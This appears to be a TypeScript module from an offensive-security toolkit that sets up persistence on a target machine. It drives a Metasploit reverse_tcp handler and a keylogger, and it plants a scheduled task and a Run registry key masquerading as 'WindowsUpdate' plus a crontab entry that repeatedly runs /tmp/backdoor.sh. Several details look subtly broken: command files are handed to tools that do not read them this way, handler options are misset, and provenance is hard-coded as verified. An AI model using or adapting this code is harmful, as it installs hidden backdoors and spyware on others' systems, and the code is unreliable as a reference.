/**
 * OffSec by True Hacking — Adapter: Persistence (backdoor, keylogger, scheduled task, registry).
 *
 * Creates persistence on a target (backdoor, keylogger, scheduled task, registry entry, cron).
 * See: https://github.com/morluto/rea/blob/main/src/adapter/
 */

import { spawnSync } from "node:child_process";
import { tmpdir } from "node:os";
import { writeFileSync, existsSync } from "node:fs";
import { randomUUID } from "node:crypto";

import type { ExploitResult, Provenance } from "../domain/analysisResultProjection.js";

/**
 * Create persistence (backdoor, keylogger, scheduled task, registry, cron).
 *
 * @param options - Persistence options (backdoor, keylogger, schedule, registry).
 */
export function persistence(options: {
  target: string;
  actions?: string[];  // backdoor, keylogger, schedule, registry, cron
  options?: Record<string, string>;
}): ExploitResult {
  const target = options.target;
  const actions = options.actions || [];
  const results: Record<string, any> = {};

  // Backdoor (insert backdoor: reverse shell, reverse connect).
  if (actions.includes("backdoor")) {
    const msfPath = findBinary("msfconsole");
    if (msfPath) {
      const commands = [
        `use exploit/multi/handler`,
        `set PAYLOAD reverse_tcp`,
        `set LPORT 4444`,
        `set RHOSTS ${target}`,
        `exploit -j`,
      ];
      const file = `${tmpdir()}/${randomUUID()}.msf`;
      writeFileSync(file, commands.join("\n"));
      const child = spawnSync(msfPath, [file], { timeout: 600000, maxBuffer: 1024 * 1024 });
      results.backdoor = String(child.stdout ?? "");
    } else {
      results.backdoor = `{stub: no 'msfconsole' binary (install: brew install metasploit or apt install metasploit-framework).}`;
    }
  }

  // Keylogger (screenshot + key capture).
  if (actions.includes("keylogger")) {
    const keysPath = findBinary("keylogger");
    if (keysPath) {
      const commands = [`keylogger -target ${target}`];
      const file = `${tmpdir()}/${randomUUID()}.sh`;
      writeFileSync(file, commands.join("\n"));
      const child = spawnSync(keysPath, [file], { timeout: 300000, maxBuffer: 1024 * 1024 });
      results.keylogger = String(child.stdout ?? "");
    } else {
      results.keylogger = `{stub: no 'keylogger' binary (install: keylogger package).}`;
    }
  }

  // Scheduled task (persist: Windows scheduled task, macOS cron, Linux crontab).
  if (actions.includes("schedule")) {
    const psPath = findBinary("powershell");
    if (psPath) {
      const commands = [
        `New-ScheduledTask -TaskName "WindowsUpdate" -Trigger (New-ScheduledTaskTrigger -Daily) -Action (New-ScheduledTaskAction -FilePath "cmd.exe" -Argument "/c net user")`,
      ];
      const file = `${tmpdir()}/${randomUUID()}.ps1`;
      writeFileSync(file, commands.join("\n"));
      const child = spawnSync(psPath, [file], { timeout: 30000, maxBuffer: 1024 * 1024 });
      results.schedule = String(child.stdout ?? "");
    } else {
      const shPath = findBinary("bash");
      if (shPath) {
        const commands = [`echo "*/5 * * * * /tmp/backdoor.sh" | crontab -`];
        const file = `${tmpdir()}/${randomUUID()}.sh`;
        writeFileSync(file, commands.join("\n"));
        const child = spawnSync(shPath, [file], { timeout: 30000, maxBuffer: 1024 * 1024 });
        results.schedule = String(child.stdout ?? "");
      } else {
        results.schedule = `{stub: no 'bash' or 'powershell' (install: brew install bash or powershell).}`;
      }
    }
  }

  // Registry (persist: HKLM\Run, registry key).
  if (actions.includes("registry")) {
    const regPath = findBinary("reg");
    if (regPath) {
      const commands = [`reg add "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "WindowsUpdate" /t REG_SZ /d "C:\\Windows\\Temp\\update.exe"`];
      const file = `${tmpdir()}/${randomUUID()}.reg`;
      writeFileSync(file, commands.join("\n"));
      const child = spawnSync(regPath, [file], { timeout: 30000, maxBuffer: 1024 * 1024 });
      results.registry = String(child.stdout ?? "");
    } else {
      results.registry = `{stub: no 'reg' binary (install: mingw-w64 or use PowerShell).}`;
    }
  }

  // Cron (persist: crontab entry).
  if (actions.includes("cron")) {
    const crontabPath = findBinary("crontab");
    if (crontabPath) {
      const commands = [`echo "*/5 * * * * /tmp/backdoor.sh" | crontab -`];
      const file = `${tmpdir()}/${randomUUID()}.sh`;
      writeFileSync(file, commands.join("\n"));
      const child = spawnSync(crontabPath, [file], { timeout: 30000, maxBuffer: 1024 * 1024 });
      results.cron = String(child.stdout ?? "");
    } else {
      results.cron = `{stub: no 'crontab' binary (install: apt install cron).}`;
    }
  }

  return {
    target,
    payload: `persistence/${actions.join(",")}`,
    success: Object.keys(results).length > 0,
    output: JSON.stringify(results),
    provenance: createProvenance("persistence", `persistence://${target}/${actions.join(",")}`),
  };
}

/** Find the binary (msfconsole/keylogger/powershell/reg/bash/crontab). */
function findBinary(name: string): string | undefined {
  const candidates = [
    "/usr/local/bin/" + name,
    "/usr/bin/" + name,
    "/opt/homebrew/bin/" + name,
  ];
  for (const path of candidates) {
    try {
      require("node:fs").accessSync(path);
      return path;
    } catch {
      // Skip.
    }
  }
  return undefined;
}

/** Create a PCAP result (provenance). */
function createProvenance(type: string, path: string): Provenance {
  return {
    id: `${type}://${path}`,
    type,
    path,
    label: "",
    verified: true,
    sensitive: path.includes("password") || path.includes("credential"),
  };
}
